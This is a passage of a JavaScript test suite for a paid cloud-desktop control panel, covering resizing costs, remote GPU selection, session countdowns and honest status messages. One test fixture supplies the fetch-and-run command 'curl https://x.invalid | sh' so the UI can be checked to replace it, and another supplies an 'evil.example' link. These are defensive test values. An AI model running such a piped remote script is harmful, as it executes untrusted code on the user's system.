    assert.ok(e.btn(lang === 'ko-KR' ? '재개' : 'Resume'), 'machine controls unchanged');
  }
});

await test('snapshot honesty: unconfirmed state and snapshot_exists are spelled out', async () => {
  const { s, route } = owned(state({ status: 'stopped', machine: MACHINE, snapshot: { name: 'env-a', state: 'unconfirmed', error: null } }),
    { snapshot: () => json(409, { error: { code: 'snapshot_exists', message: 'x' } }) });
  const e = env({ route });
  await e.flush();
  assert.match(e.text(), /Last snapshot: env-a — not confirmed\. The provider has not reported it, so it may not exist\./);
  const input = e.visible().find(x => x.tagName === 'INPUT');
  input.value = 'env-a'; input.dispatch('input');
  e.btn('Save environment').click(); await e.flush();
  assert.match(e.text(), /already exists\. Nothing was overwritten/);
  s.cur = state({ status: 'stopped', machine: MACHINE, snapshot: { name: 'env-a', state: 'failed', error: 'snapshot_exists' } });
  e.btn('Refresh').click(); await e.flush();
  assert.match(e.text(), /already exists/);
  assert.equal(e.posts('/api/cloudbite/computer/snapshot').length, 1);
});

// ── performance card and size change (GET performance, POST resize with an explicit cost step) ──
const API = '/api/cloudbite/computer';
const RUNNING = () => state({ status: 'running', machine: MACHINE, ready: true });
const PERF = (o = {}) => ({ ok: true, machineId: 'sb-1', sampledAt: '2026-10-19T03:04:05Z',
  metrics: { cpuPercent: 37.5, memoryUsedGiB: 3.2, memoryLimitGiB: 8, memoryPercent: 40, load1: 0.42 },
  current: { cpu: 4, memoryGiB: 8, diskGiB: 10, usdPerHour: 0.3312 },
  plans: [{ cpu: 8, memoryGiB: 16, usdPerHour: 0.6624, deltaUsdPerHour: 0.3312 }, { cpu: 16, memoryGiB: 32, usdPerHour: 1.3248, deltaUsdPerHour: 0.9936 },
    { cpu: 2, memoryGiB: 4, usdPerHour: 0.1656, deltaUsdPerHour: -0.1656 }],
  resize: { status: 'idle' }, pricing: { asOf: '2026-10-19', url: 'https://www.daytona.io/pricing', estimated: true }, ...o });
const byId = (e, id) => e.all().find(x => x.id === id);
const pick = (sel, value) => { sel.value = value; sel.dispatch('change'); };
const perfGets = (e) => e.requests.filter(r => r.url === `${API}/performance`).length;
const reply = (status, body) => ({ ok: status >= 200 && status < 300, status, json: async () => body });
const defer = () => { let resolve; const p = new Promise(r => { resolve = r; }); return { p, resolve }; };

await test('performance: read only on Check now; real usage with its timestamp, or unknown — never a fake zero', async () => {
  let perf = PERF();
  const { route } = owned(RUNNING(), { performance: () => json(200, perf) });
  const e = env({ route });
  await e.flush(); await e.advance(60000);
  assert.equal(perfGets(e), 0, 'not fetched on sign-in or by polling');
  assert.match(e.text(), /Not checked yet/);
  e.btn('Check now').click(); await e.flush();
  assert.equal(perfGets(e), 1);
  assert.match(e.text(), /Current size \| 4 vCPU · 8 GiB RAM · about \$0\.3312 per hour/);
  assert.match(e.text(), /CPU use \| 37\.5%/);
  assert.match(e.text(), /Memory use \| 3\.2 of 8 GiB \(40%\)/);
  assert.match(e.text(), /Load \(1 min\) \| 0\.42/);
  assert.match(e.text(), /Measured /);
  assert.match(e.text(), /as of 2026-10-19\. Not a quote or guarantee/);
  assert.equal(e.links().find(a => a.textContent === 'Daytona pricing').getAttribute('href'), 'https://www.daytona.io/pricing');
  perf = PERF({ sampledAt: null, metrics: null, pricing: { asOf: '2026-10-19', url: 'https://evil.example/pricing', estimated: true } });
  e.btn('Check now').click(); await e.flush();
  assert.match(e.text(), /did not report live usage/);
  assert.match(e.text(), /CPU use \| unknown \| Memory use \| unknown/);
  assert.ok(!/\b0%/.test(e.text()), 'unknown is never drawn as 0%');
  assert.equal(e.links().find(a => a.textContent === 'Daytona pricing'), undefined, 'pricing link only to daytona.io');
  perf = PERF({ metrics: { cpuPercent: null, memoryUsedGiB: 1, memoryLimitGiB: 8, memoryPercent: 12.5, load1: 0 } });
  e.btn('Check now').click(); await e.flush();
  assert.match(e.text(), /CPU use \| unknown \| Memory use \| 1 of 8 GiB \(12\.5%\)/);
  assert.equal(e.posts(`${API}/resize`).length, 0);
});

await test('size change: plan selector offers only increases; Review shows target and hourly delta; only Apply POSTs resize', async () => {
  let perf = PERF();
  const { s, route } = owned(RUNNING(), {
    performance: () => json(200, perf),
    resize: () => { perf = PERF({ resize: { status: 'pending', cpu: 8, memoryGiB: 16 } }); return json(200, RUNNING()); },
  });
  const e = env({ route });
  await e.flush();
  e.btn('Check now').click(); await e.flush();
  const plan = byId(e, 'cc-plan');
  assert.deepEqual(plan.children.map(o => o.value), ['', '8/16', '16/32'], 'smaller size filtered out');
  assert.match(plan.children[1].textContent, /8 vCPU · 16 GiB RAM — \$0\.3312 per hour more/);
  assert.equal(e.btn('Review cost').disabled, true, 'nothing chosen yet');
  pick(plan, '8/16');
  e.btn('Review cost').click(); await e.flush();
  assert.match(e.text(), /Confirm the size change/);
  assert.match(e.text(), /Now \| 4 vCPU · 8 GiB RAM · about \$0\.3312 per hour/);
  assert.match(e.text(), /After \| 8 vCPU · 16 GiB RAM · about \$0\.6624 per hour/);
  assert.match(e.text(), /Extra cost \| \$0\.3312 more per hour while the machine runs/);
  assert.match(e.text(), /Disk stays 10 GiB/);
  assert.equal(e.posts(`${API}/resize`).length, 0, 'review alone sends nothing');
  e.btn('Cancel').click(); await e.flush();
  assert.equal(e.btn('Apply upgrade'), undefined);
  e.btn('Review cost').click();
  pick(plan, '16/32');
  assert.equal(e.btn('Apply upgrade'), undefined, 'changing the size closes the review');
  pick(plan, '8/16'); e.btn('Review cost').click();
  const before = perfGets(e);
  e.btn('Apply upgrade').click(); await e.flush();
  const [p] = e.posts(`${API}/resize`);
  assert.deepEqual(Object.keys(p.body), ['requestId', 'cpu', 'memoryGiB', 'acknowledgeCost']);
  assert.match(p.body.requestId, UUID);
  assert.deepEqual({ ...p.body, requestId: 0 }, { requestId: 0, cpu: 8, memoryGiB: 16, acknowledgeCost: true });
  assert.equal(perfGets(e), before + 1, 'answer reconciled with a GET performance');
  assert.match(e.text(), /counts only once the machine reports the new size/);
  assert.match(e.text(), /size change to 8 vCPU · 16 GiB RAM is in progress/);
  assert.ok(!/The machine reports 8 vCPU/.test(e.text()), 'not claimed until the machine reports it');
  assert.equal(e.btn('Review cost').disabled, true, 'no second change while one is pending');
  assert.equal(plan.disabled, true);
  perf = PERF({ current: { cpu: 8, memoryGiB: 16, diskGiB: 10, usdPerHour: 0.6624 }, plans: [{ cpu: 16, memoryGiB: 32, usdPerHour: 1.3248, deltaUsdPerHour: 0.6624 }] });
  e.btn('Check now').click(); await e.flush();
  assert.match(e.text(), /The machine reports 8 vCPU · 16 GiB RAM\./);
  assert.equal(e.posts(`${API}/resize`).length, 1);
  assert.deepEqual(e.requests.filter(r => r.method === 'POST').map(r => r.url), [`${API}/resize`], 'nothing else was started');
  assert.equal(s.cur.status, 'running');
});

await test('size change: offered only while running; changed prices close the review instead of applying', async () => {
  let perf = PERF();
  const { s, route } = owned(state({ status: 'stopped', machine: MACHINE }), { performance: () => json(200, perf), resize: () => json(200, RUNNING()) });
  const e = env({ route });
  await e.flush();
  e.btn('Check now').click(); await e.flush();
  assert.equal(byId(e, 'cc-plan').disabled, true);
  assert.match(e.text(), /available while the machine is running/);
  s.cur = RUNNING();
  e.btn('Refresh').click(); await e.flush();
  pick(byId(e, 'cc-plan'), '8/16'); e.btn('Review cost').click();
  perf = PERF({ plans: [{ cpu: 8, memoryGiB: 16, usdPerHour: 0.7, deltaUsdPerHour: 0.3688 }] });
  e.btn('Check now').click(); await e.flush();
  assert.equal(e.btn('Apply upgrade'), undefined);
  assert.match(e.text(), /prices changed\. Review again/);
  assert.equal(e.posts(`${API}/resize`).length, 0);
});

await test('size change uncertain: Retry repeats the same requestId; Forget needs a fresh Check now before another change', async () => {
  let perfOk = true, n = 0;
  const { route } = owned(RUNNING(), {
    performance: () => (perfOk ? json(200, PERF()) : json(503, { error: { code: 'upstream_unavailable', message: 'x' } })),
    resize: () => { n++; return n === 1 ? Promise.reject(new Error('lost')) : json(503, { error: { code: 'upstream_unavailable', message: 'x' } }); },
  });
  const e = env({ route });
  await e.flush();
  e.btn('Check now').click(); await e.flush();
  pick(byId(e, 'cc-plan'), '8/16'); e.btn('Review cost').click(); e.btn('Apply upgrade').click(); await e.flush();
  assert.match(e.text(), /No definite answer/);
  assert.equal(e.btn('Review cost').disabled, true);
  e.btn('Retry same request').click(); await e.flush();
  const ids = e.posts(`${API}/resize`).map(r => r.body.requestId);
  assert.equal(ids.length, 2); assert.equal(new Set(ids).size, 1, 'same requestId');
  assert.deepEqual(e.posts(`${API}/resize`)[1].body, e.posts(`${API}/resize`)[0].body, 'same arguments');
  perfOk = false;
  const before = perfGets(e);
  e.btn('Forget it').click(); await e.flush();
  assert.equal(perfGets(e), before + 1, 'forgetting re-reads performance (GET), never re-POSTs');
  assert.match(e.text(), /see whether the last size change was applied/);
  assert.equal(e.btn('Review cost').disabled, true, 'blocked until a fresh read succeeds');
  perfOk = true;
  e.btn('Check now').click(); await e.flush();
  pick(byId(e, 'cc-plan'), '8/16');
  assert.equal(e.btn('Review cost').disabled, false);
  assert.equal(e.posts(`${API}/resize`).length, 2);
});

// ── remote GPU card (GET compute/sandboxes, GET gpu/candidates, POST gpu/select) ──
const SANDBOXES = { ok: true, partial: true, sandboxes: [
  { id: 'sb-1', account: 'primary', name: 'cloudbite-computer-owner', region: 'us', state: 'started', cpu: 4, memoryGiB: 8 },
  { id: 'sb-eu', account: 'secondary', name: 'lab-eu', region: 'eu', state: 'stopped', cpu: 2, memoryGiB: 4 },
  { id: 'bad id!', account: 'primary', name: 'x', region: 'us', state: 'started', cpu: 1, memoryGiB: 1 }] };
const CANDS = (sb, o = {}) => ({ ok: true, sandbox: { id: sb.id, account: sb.account, name: sb.name, region: sb.region }, observedAt: '2026-10-19T03:00:00Z',
  locationBasis: 'region-country-estimate', note: 'Hosts per country come from Nosana.', candidates: [
    { id: 'rtx4090-US', gpu: 'NVIDIA RTX 4090', vramGb: 24, available: 3, country: 'US', market: '4090-us', usdPerHourMin: 0.35, usdPerHourMax: 0.42, distanceKm: 812.4, selectable: true },
    { id: 'a100-DE', gpu: 'A100 80GB', vramGb: 80, available: 0, country: 'DE', market: null, usdPerHourMin: null, usdPerHourMax: null, distanceKm: null, selectable: true },
    { id: 'h100-x', gpu: 'H100', vramGb: 80, available: 2, country: null, market: null, usdPerHourMin: 2.1, usdPerHourMax: 2.1, distanceKm: null, selectable: false }], ...o });
const SB1 = SANDBOXES.sandboxes[0], SBEU = SANDBOXES.sandboxes[1];

function gpuRoute(handlers) {
  const { s, route: base } = owned(RUNNING(), { 'compute/sandboxes': () => json(200, SANDBOXES), 'auth/logout': () => json(200, { authenticated: false }), ...handlers });
  const route = (r, all) => (r.url.startsWith(`${API}/gpu/candidates?`) && handlers.candidates ? handlers.candidates(r, s) : base(r, all));
  return { s, route };
}
const candItem = (e, id) => e.visible().find(x => x.getAttribute('data-candidate') === id);
const candBtn = (e, id) => [...candItem(e, id).walk()].find(x => x.tagName === 'BUTTON');

await test('GPU: nothing fetched until asked; sandbox dropdown, exact candidate query, estimates and unavailable hosts disabled', async () => {
  const { route } = gpuRoute({ candidates: () => json(200, CANDS(SB1)) });
  const e = env({ route });
  await e.flush(); await e.advance(60000);
  assert.equal(e.requests.filter(r => /\/(compute|gpu)\//.test(r.url)).length, 0, 'no GPU or sandbox call on sign-in or by polling');
  assert.match(e.text(), /Remote GPU jobs/);
  assert.match(e.text(), /not a CUDA device in this machine/);
  assert.match(e.text(), /does not switch your desktop/);
  assert.equal(byId(e, 'cc-gpu-sandbox').shown(), false);
  e.btn('Load my sandboxes').click(); await e.flush();
  const sel = byId(e, 'cc-gpu-sandbox');
  assert.deepEqual(sel.children.map(o => o.value), ['', 'primary/sb-1', 'secondary/sb-eu'], 'unsafe ids dropped');
  assert.match(e.text(), /may be incomplete/);
  assert.ok(!e.visible().some(x => x.tagName === 'INPUT' && x.id !== 'cc-snap-name'), 'no free-text region or location input');
  assert.equal(e.btn('Find GPUs').disabled, true);
  pick(sel, 'primary/sb-1');
  e.btn('Find GPUs').click(); await e.flush();
  const q = e.requests.filter(r => r.url.startsWith(`${API}/gpu/candidates?`));
  assert.deepEqual(q.map(r => r.url), [`${API}/gpu/candidates?sandboxId=sb-1&account=primary&minVramGb=24`]);
  assert.match(candItem(e, 'rtx4090-US').textContent, /US · about 812 km away \(estimate\)/);
  assert.match(candItem(e, 'rtx4090-US').textContent, /24 GB GPU memory/);
  assert.match(candItem(e, 'rtx4090-US').textContent, /3 free hosts · Base price \$0\.3500–\$0\.4200\/h/);
  assert.match(e.text(), /not measured network latency\. Network fee is separate\./);
  assert.match(e.text(), /From cloudbite-computer-owner \(us\) · Checked /);
  assert.match(e.text(), /Hosts per country come from Nosana\./);
  assert.equal(candBtn(e, 'a100-DE').textContent, 'Not available now', '0 free hosts is not choosable even if flagged selectable');
  assert.equal(candBtn(e, 'a100-DE').disabled, true);
  assert.match(candItem(e, 'a100-DE').textContent, /DE · distance unknown.*Price not reported/);
  assert.equal(candBtn(e, 'h100-x').disabled, true);
  assert.match(candItem(e, 'h100-x').textContent, /Location unknown/);
  pick(byId(e, 'cc-gpu-vram'), '48');
  assert.equal(candItem(e, 'rtx4090-US'), undefined, 'changing the filter drops old results');
  e.btn('Find GPUs').click(); await e.flush();
  assert.match(e.requests.at(-1).url, /minVramGb=48$/);
  assert.equal(e.requests.filter(r => r.method === 'POST').length, 0, 'refresh never starts anything');
});

await test('GPU: Choose records a preference only (no rental), shows a copyable CLI line, never switches the desktop', async () => {
  let cmd = 'cloudbite-compute run --provider nosana --gpu "NVIDIA RTX 4090" --country US -- python train.py';
  const { s, route } = gpuRoute({
    candidates: () => json(200, CANDS(SB1)),
    'gpu/select': (r) => json(200, { ok: true, selection: { candidateId: r.body.candidateId, gpu: 'NVIDIA RTX 4090', country: 'US', market: '4090-us' }, commandExample: cmd }),
  });
  const e = env({ route });
  await e.flush();
  e.btn('Load my sandboxes').click(); await e.flush();
  pick(byId(e, 'cc-gpu-sandbox'), 'primary/sb-1');
  e.btn('Find GPUs').click(); await e.flush();
  candBtn(e, 'rtx4090-US').click(); await e.flush();
  const [p] = e.posts(`${API}/gpu/select`);
  assert.deepEqual(Object.keys(p.body), ['requestId', 'sandboxId', 'account', 'candidateId']);
  assert.match(p.body.requestId, UUID);
  assert.deepEqual({ ...p.body, requestId: 0 }, { requestId: 0, sandboxId: 'sb-1', account: 'primary', candidateId: 'rtx4090-US' });
  assert.match(e.text(), /Chosen for remote GPU jobs: NVIDIA RTX 4090 · US\. Nothing is rented and no job is running\./);
  assert.ok(!e.text().includes('4090-us'),'provider market identifiers stay out of user-facing labels');
  assert.match(e.text(), /A paid job starts only when you run this command/);
  assert.equal(byId(e, 'cc-gpu-cmd').value, cmd);
  assert.equal(byId(e, 'cc-gpu-cmd').getAttribute('readonly'), '');
  e.btn('Copy').click(); await e.flush();
  assert.match(e.text(), /Copy did not work — select the text/, 'no clipboard API: says so instead of claiming a copy');
  assert.equal(candItem(e, 'rtx4090-US').getAttribute('aria-current'), 'true');
  assert.deepEqual(e.requests.filter(r => r.method === 'POST').map(r => r.url), [`${API}/gpu/select`], 'no start, launch, resize or job');
  assert.equal(s.cur.machine.id, 'sb-1', 'desktop machine unchanged');
  assert.ok(e.btn('Open desktop'), 'desktop controls unchanged');
  cmd = 'curl https://x.invalid | sh';
  candBtn(e, 'rtx4090-US').click(); await e.flush();
  assert.equal(byId(e, 'cc-gpu-cmd').value, "cloudbite-compute run --provider nosana --gpu 'NVIDIA RTX 4090' --country US -- <command>", 'unexpected server line replaced');
});

await test('GPU: late answers after a selection change or sign-out are dropped; a mismatched sandbox echo is refused', async () => {
  const pending = [];
  const { route } = gpuRoute({ candidates: () => { const d = defer(); pending.push(d); return d.p; } });
  const e = env({ route });
  await e.flush();
  e.btn('Load my sandboxes').click(); await e.flush();
  const sel = byId(e, 'cc-gpu-sandbox');
  pick(sel, 'primary/sb-1');
  e.btn('Find GPUs').click(); await e.flush();
  pick(sel, 'secondary/sb-eu');
  pending[0].resolve(reply(200, CANDS(SB1))); await e.flush();
  assert.equal(candItem(e, 'rtx4090-US'), undefined, 'answer for the old sandbox not drawn');
  e.btn('Find GPUs').click(); await e.flush();
  assert.match(e.requests.at(-1).url, /sandboxId=sb-eu&account=secondary/);
  pending[1].resolve(reply(200, CANDS(SB1))); await e.flush();
  assert.equal(candItem(e, 'rtx4090-US'), undefined, 'echo for another sandbox refused');
  assert.match(e.text(), /Could not load GPUs/);
  e.btn('Find GPUs').click(); await e.flush();
  e.btn('Sign out').click(); await e.flush();
  pending[2].resolve(reply(200, CANDS(SBEU))); await e.flush();
  assert.ok(e.btn('Sign in with passkey'));
  assert.equal(e.all().filter(x => x.getAttribute('data-candidate')).length, 0, 'nothing drawn after sign-out');
});

await test('GPU choice uncertain: same requestId on retry, sandbox and filter locked until answered', async () => {
  let n = 0;
  const { route } = gpuRoute({
    candidates: () => json(200, CANDS(SB1)),
    'gpu/select': (r) => { n++; return n === 1 ? Promise.reject(new Error('lost')) : json(200, { ok: true, selection: { candidateId: r.body.candidateId, gpu: 'NVIDIA RTX 4090', country: 'US', market: null }, commandExample: '' }); },
  });
  const e = env({ route });
  await e.flush();
  e.btn('Load my sandboxes').click(); await e.flush();
  pick(byId(e, 'cc-gpu-sandbox'), 'primary/sb-1');
  e.btn('Find GPUs').click(); await e.flush();
  candBtn(e, 'rtx4090-US').click(); await e.flush();
  assert.match(e.text(), /No definite answer/);
  assert.equal(byId(e, 'cc-gpu-sandbox').disabled, true);
  assert.equal(byId(e, 'cc-gpu-vram').disabled, true);
  assert.equal(e.btn('Find GPUs').disabled, true);
  e.btn('Retry same request').click(); await e.flush();
  const ids = e.posts(`${API}/gpu/select`).map(r => r.body.requestId);
  assert.equal(ids.length, 2); assert.equal(new Set(ids).size, 1);
  assert.match(e.text(), /Chosen for remote GPU jobs: NVIDIA RTX 4090 · US\./);
  assert.equal(byId(e, 'cc-gpu-cmd').value, "cloudbite-compute run --provider nosana --gpu 'NVIDIA RTX 4090' --country US -- <command>");
});

await test('KO: performance and remote GPU cards speak Korean with plain button labels', async () => {
  const { route } = gpuRoute({ performance: () => json(200, PERF()) });
  const e = env({ route, language: 'ko-KR' });
  await e.flush();
  assert.match(e.text(), /원격 GPU 작업/);
  assert.match(e.text(), /CUDA 장치가 아니므로/);
  e.btn('지금 확인').click(); await e.flush();
  assert.match(e.text(), /CPU 사용률 \| 37\.5%/);
  pick(byId(e, 'cc-plan'), '8/16'); e.btn('비용 확인').click();
  assert.match(e.text(), /머신이 켜져 있는 동안 시간당 \$0\.3312 추가/);
  assert.ok(e.btn('업그레이드 적용'));
  assert.ok(e.btn('내 샌드박스 불러오기'));
  e.btn('EN').click();
  assert.ok(e.btn('Apply upgrade'), 'language switch keeps the open review');
});

// ── paid session: countdown, <=10 min warning, deadline (fake clock). Display only: it never extends, starts or stops by itself ──
const MIN = 60000;
const at = (ms) => new Date(T0 + ms).toISOString();
const RUN_UNTIL = (ms, o = {}) => state({ status: 'running', machine: MACHINE, ready: true, sessionEndsAt: at(ms), ...o });
const stateGets = (e) => e.requests.filter(r => r.url === `${API}/state`).length;
const machinePosts = (e) => e.requests.filter(r => r.method === 'POST' && !r.url.startsWith(AUTH));
const ticket = (e) => e.links().find(x => x.textContent === 'Open the desktop');

await test('session countdown: minutes, then mm:ss with an inline RAM warning at <=10 min; Extend is one click, never automatic', async () => {
  let e;
  const { route } = owned(RUN_UNTIL(11 * MIN), { extend: (r, s) => { s.cur = RUN_UNTIL(e.now() - T0 + 120 * MIN); return json(200, s.cur); } });
  e = env({ route });
  await e.flush();
  assert.match(e.text(), /\(11 min left\)/);
  assert.ok(!/Less than 10 minutes left/.test(e.text()));
  assert.equal(e.btn('Extend session').className, 'cc-btn');
  assert.equal(e.timers.size, 1, 'one countdown tick, no polling');
  await e.advance(MIN);
  assert.match(e.text(), /\(10:00 left\)/);
  assert.match(e.text(), /Less than 10 minutes left\. When time runs out the machine stops by itself: files on disk are kept, but open programs, terminals and anything only in memory \(RAM\) are closed and not saved\./);
  await e.advance(1000); assert.match(e.text(), /\(9:59 left\)/);
  await e.advance(1000); assert.match(e.text(), /\(9:58 left\)/);
  assert.equal(e.btn('Extend session').className, 'cc-btn cc-primary', 'Extend is the obvious next step');
  await e.advance(5 * MIN);
  assert.equal(machinePosts(e).length, 0, 'the warning never extends, stops or starts anything');
  assert.equal(stateGets(e), 1, 'the countdown itself does not poll');
  e.btn('Extend session').click(); await e.flush();
  const ext = e.posts(`${API}/extend`);
  assert.equal(ext.length, 1);
  assert.deepEqual(Object.keys(ext[0].body), ['requestId']); assert.match(ext[0].body.requestId, UUID);
  assert.match(e.text(), /Session extended — it now ends /);
  assert.ok(!/Less than 10 minutes left/.test(e.text()));
  assert.match(e.text(), /\(2 h 0 min left\)/);
  assert.ok(!/Notification|requestPermission|localStorage|sessionStorage/.test(CLOUDBITE_COMPUTER_JS), 'no notification permission or browser storage');
});

await test('deadline passes: ticket dropped and Open disabled at once, one state check, then only the server says stopped; nothing POSTed', async () => {
  const { s, route } = owned(RUN_UNTIL(2 * MIN), { launch: () => json(200, { ok: true, url: `${GW}/p/_cloudbite/computer/desktop/?t=abc` }) });
  const e = env({ route });
  await e.flush();
  e.btn('Open desktop').click(); await e.flush();
  assert.ok(ticket(e));
  const before = stateGets(e);
  await e.advance(2 * MIN);
  assert.equal(ticket(e), undefined, 'desktop ticket dropped at the deadline');
  assert.equal(e.btn('Open desktop').disabled, true);
  assert.match(e.text(), /Paid session: time is up\./);
  assert.match(e.text(), /Time is up\. Checking with the server — the desktop cannot be opened until it answers\./);
  assert.equal(stateGets(e), before + 1, 'one authoritative check at the deadline');
  assert.ok(!/server reports the machine stopped/.test(e.text()), 'not claimed stopped before the server says so');
  s.cur = state({ status: 'stopped', machine: MACHINE });
  await e.advance(3000);
  assert.match(e.text(), /The paid session ended and the server reports the machine stopped\. Files on disk are kept; programs that were open and anything only in memory \(RAM\) were closed and are not restored\./);
  assert.ok(e.btn('Resume'));
  assert.equal(e.btn('Open desktop'), undefined);
  await e.advance(30 * MIN);
  assert.deepEqual(e.requests.filter(r => r.method === 'POST').map(r => r.url), [`${API}/launch`], 'no automatic extend, stop or start');
  assert.ok(!/Session extended/.test(e.text()));
});

await test('server still running after the deadline: Open stays closed with bounded rechecks; a later server deadline reopens it', async () => {
  let e;
  const { s, route } = owned(RUN_UNTIL(MIN));
  e = env({ route });
  await e.flush(); await e.advance(MIN + 30000);
  assert.equal(e.btn('Open desktop').disabled, true);
  assert.ok(stateGets(e) >= 5, `rechecks while past the deadline (${stateGets(e)})`);
  s.cur = RUN_UNTIL(e.now() - T0 + 90 * MIN); // extended from another device
  await e.advance(3000);
  assert.equal(e.btn('Open desktop').disabled, false);
  assert.match(e.text(), /\(1 h 29 min left\)/);
  assert.ok(!/Time is up/.test(e.text()));
  const n = stateGets(e);
  await e.advance(5 * MIN);
  assert.equal(stateGets(e), n, 'rechecks stop once the deadline is ahead again');
  assert.equal(machinePosts(e).length, 0);
  const { route: r2 } = owned(RUN_UNTIL(MIN));
  const f = env({ route: r2 });
  await f.flush(); await f.advance(2 * 60 * MIN);
  const bounded = stateGets(f);
  assert.ok(bounded <= 2 + 90, `bounded (${bounded})`);
  await f.advance(60 * MIN); assert.equal(stateGets(f), bounded, 'stops at the bound');
});

await test('clock and polls stop while hidden and on sign-out; returning re-reads server state and explains an expiry seen there', async () => {
  let e;
  const { s, route } = owned(RUN_UNTIL(30 * MIN), { 'auth/logout': () => json(200, { authenticated: false }) });
  e = env({ route });
  await e.flush();
  assert.equal(e.timers.size, 1);
  e.setVisibility('hidden'); await e.flush();
  assert.equal(e.timers.size, 0, 'no ticking while hidden');
  const n = stateGets(e);
  s.cur = state({ status: 'stopped', machine: MACHINE });
  await e.advance(40 * MIN);
  assert.equal(stateGets(e), n, 'nothing fetched while hidden');
  e.setVisibility('visible'); await e.flush();
  assert.equal(stateGets(e), n + 1, 'one state read on return');
  assert.match(e.text(), /server reports the machine stopped/);
  assert.equal(e.timers.size, 0, 'stopped: no ticking');
  s.cur = RUN_UNTIL(e.now() - T0 + 60 * MIN);
  e.btn('Refresh').click(); await e.flush();
  assert.ok(!/server reports the machine stopped/.test(e.text()), 'a new session clears the ended note');
  assert.equal(e.timers.size, 1);
  e.btn('Sign out').click(); await e.flush();
  assert.ok(e.btn('Sign in with passkey') || /Signed out/.test(e.text()));
  assert.equal(e.timers.size, 0, 'no timers after sign-out');
  await e.advance(3 * 60 * MIN);
  assert.equal(machinePosts(e).length, 0);
  assert.equal(stateGets(e), n + 2);
});

await test('Extend lost near the deadline: retry keeps the requestId; a late stop is never shown as extended or resumed', async () => {
  let n = 0;
  const { s, route } = owned(RUN_UNTIL(90 * 1000), { extend: () => { n++; return n === 1 ? Promise.reject(new Error('lost')) : json(409, { error: { code: 'not_running', message: 'x' } }); } });
  const e = env({ route });
  await e.flush();
  e.btn('Extend session').click(); await e.flush();
  assert.match(e.text(), /No definite answer/);
  await e.advance(90 * 1000);
  assert.match(e.text(), /Time is up\. Checking with the server/);
  s.cur = state({ status: 'stopped', machine: MACHINE });
  await e.advance(3000);
  assert.match(e.text(), /server reports the machine stopped/);
  assert.ok(!/Session extended/.test(e.text()));
  e.btn('Retry same request').click(); await e.flush();
  const ids = e.posts(`${API}/extend`).map(r => r.body.requestId);
  assert.equal(ids.length, 2); assert.equal(new Set(ids).size, 1, 'same requestId');
  assert.match(e.text(), /Rejected: not_running/);
  assert.equal(e.posts(`${API}/start`).length, 0, 'never resumed by itself');
  // a definite Extend answer that shows a stopped machine is not taken as an extension
  const late = owned(RUN_UNTIL(5 * MIN), { extend: (r, s2) => { s2.cur = state({ status: 'stopped', machine: MACHINE }); return json(200, s2.cur); } });
  const f = env({ route: late.route });
  await f.flush();
  f.btn('Extend session').click(); await f.flush();
  assert.match(f.text(), /no longer running, so the session was not extended\. Resume starts it again; programs that were open are not restored\./);
  assert.ok(!/Session extended/.test(f.text()));
  assert.equal(f.posts(`${API}/start`).length, 0);
});

await test('KO countdown and warning; language switch keeps them; a wrong phone clock follows the server Date header', async () => {
  const { route } = owned(RUN_UNTIL(5 * MIN));
  const e = env({ route, language: 'ko-KR' });
  await e.flush();
  assert.match(e.text(), /\(5:00 남음\)/);
  assert.match(e.text(), /10분도 남지 않았습니다\..*메모리\(RAM\)에만 있는 내용은 닫히며 저장되지 않습니다/);
  e.btn('EN').click();
  assert.match(e.text(), /\(5:00 left\)/);
  assert.match(e.text(), /Less than 10 minutes left/);
  let f;
  const serverAt = (ms) => T0 - 3 * MIN + ms; // this phone's clock runs 3 minutes ahead of the server
  const { route: base } = owned(state({ status: 'running', machine: MACHINE, ready: true, sessionEndsAt: new Date(serverAt(2 * MIN)).toISOString() }));
  const skewed = (r, all) => (r.url === `${API}/state`
    ? base(r, all).then(res => ({ ...res, headers: { get: (k) => (k === 'date' ? new Date(serverAt(f.now() - T0)).toUTCString() : null) } }))
    : base(r, all));
  f = env({ route: skewed });
  await f.flush();
  assert.match(f.text(), /\(2:00 left\)/, 'not shown as expired');
  assert.equal(f.btn('Open desktop').disabled, false);
});

await test('failed session check retries GET only, without invoking passkeys', async () => {
  let n=0;
  const e=env({route:()=>++n===1 ? Promise.reject(new Error('offline')) : json(200,{authenticated:false,hasCredentials:true})});
  await e.flush(); assert.match(e.text(),/Network error/);
  e.btn('Check connection again').click(); await e.flush();
  assert.ok(e.btn('Sign in with passkey')); assert.equal(e.requests.length,2);
  assert.ok(e.requests.every(r=>r.method==='GET')); assert.equal(e.gets.length,0);
});

await test('offline clears tickets; online only reads state, retaining drafts and uncertain mutations', async () => {
  const {route}=owned(state({status:'running',machine:MACHINE,ready:true}),{launch:()=>json(200,{url:`${GW}/p/_cloudbite/computer/desktop?ticket=old`}),extend:()=>json(503,{})});
  const e=env({route}); await e.flush();
  const input=e.all().find(x=>x.id==='cc-snap-name'); input.value='keep-draft'; input.dispatch('input');
  e.btn('Open desktop').click(); await e.flush(); e.btn('Extend session').click(); await e.flush();
  const posts=e.requests.filter(r=>r.method==='POST').length;
  e.network(false); await e.flush(); assert.equal(e.btn('Open desktop').disabled,true); assert.match(e.text(),/You are offline/);
  assert.ok(!e.links().some(a=>(a.getAttribute('href')||'').includes('ticket=old')));
  const before=e.requests.length; e.network(true); await e.flush();
  assert.equal(e.requests.length,before+1); assert.equal(e.requests.at(-1).method,'GET');
  assert.equal(e.requests.filter(r=>r.method==='POST').length,posts); assert.equal(input.value,'keep-draft');
  assert.ok(e.btn('Retry same request'));
});

await test('failed refresh blocks launching from stale state until a successful read', async () => {
  const w=owned(state({status:'running',machine:MACHINE,ready:true})); let fail=false;
  const e=env({route:r=>r.url.endsWith('/state')&&fail ? json(502,{}) : w.route(r)}); await e.flush();
  fail=true; e.btn('Refresh').click(); await e.flush();
  assert.equal(e.btn('Open desktop').disabled,true); assert.match(e.text(),/Machine state could not be confirmed/);
  fail=false; e.btn('Refresh').click(); await e.flush(); assert.equal(e.btn('Open desktop').disabled,false);
});

await test('late state and launch replies after logout cannot restore private UI or ticket', async () => {
  let stateReply,launchReply,slow=false;
  const w=owned(state({status:'running',machine:MACHINE,ready:true}),{launch:()=>new Promise(r=>{launchReply=r;}),'auth/logout':()=>json(200,{authenticated:false})});
  const e=env({route:r=>r.url.endsWith('/state')&&slow ? new Promise(r=>{stateReply=r;}) : w.route(r)}); await e.flush();
  e.btn('Open desktop').click(); await e.flush(); slow=true; e.btn('Refresh').click(); await e.flush();
  e.btn('Sign out').click(); await e.flush();
  stateReply(await json(200,state({status:'running',machine:MACHINE,ready:true})));
  launchReply(await json(200,{url:`${GW}/p/_cloudbite/computer/desktop?ticket=late`})); await e.flush();
